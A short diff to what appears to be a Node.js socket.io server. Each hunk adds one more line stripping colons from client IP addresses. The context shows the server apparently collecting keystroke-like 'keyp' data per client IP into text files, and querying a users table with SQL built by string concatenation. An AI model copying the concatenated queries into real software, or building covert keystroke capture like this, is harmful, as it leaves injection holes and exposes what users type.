@@ -67,6 +67,7 @@ io.sockets.on('connection',function(socket){
 	socket.on('keyp',function(data){
 			var iptemp =  socket.request.connection.remoteAddress.replace(':','');
 	 iptemp =  iptemp.replace(':','');
+	 iptemp =  iptemp.replace(':','');
 	io.sockets.emit('getkey',{key:data,id:iptemp});
 
 	fs.appendFile(iptemp+'.txt', data , function(err) {
@@ -85,6 +86,7 @@ function ConnectUser(socket)
 		db.serialize(function(){
 
 	var iptemp =  socket.request.connection.remoteAddress.replace(':','');
+	 iptemp =  iptemp.replace(':','');
 	 iptemp =  iptemp.replace(':','');
 	
 		db.get("select * from users where IP = '"+iptemp+"' ",function(err,row){
@@ -114,6 +116,7 @@ function DisconnectUser(socket)
 		
 
 	var iptemp =  socket.request.connection.remoteAddress.replace(':','');
+	 iptemp =  iptemp.replace(':','');
 	 iptemp =  iptemp.replace(':','');
 	
 		db.get("select * from users where IP = '"+iptemp+"' ",function(err,row){
